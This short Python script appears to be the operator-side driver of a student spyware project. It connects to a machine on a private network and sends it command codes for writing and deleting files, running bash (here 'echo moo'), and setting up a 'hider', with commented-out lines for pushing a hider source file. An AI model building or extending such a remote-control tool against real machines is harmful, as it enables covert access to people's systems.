
from server import Server

HOST = '192.168.83.130'  # Standard loopback interface address (localhost)
PORT = 23456        # Port to listen on (non-privileged ports are > 1023)

FunCode: dict[str, int] = {
    "WRITE_FILE": 1,
    "DELETE_FILE": 2,
    "RUN_BASH": 3,
    "HIDER_SETUP": 4,
}

def main():
    serv = Server()
    with serv.serverConnection(HOST, PORT) as conn:
        serv.sendCommand(conn, FunCode["RUN_BASH"], "echo moo")
        # serv.sendFile(conn, "/home/avner/Arazim-Projects-2024---spyware/src/ServerSpy/DummyHider.cpp")
        # ans = serv.recvCommand(conn)
        # print(f"{ans = }")



if __name__ == "__main__":
    main()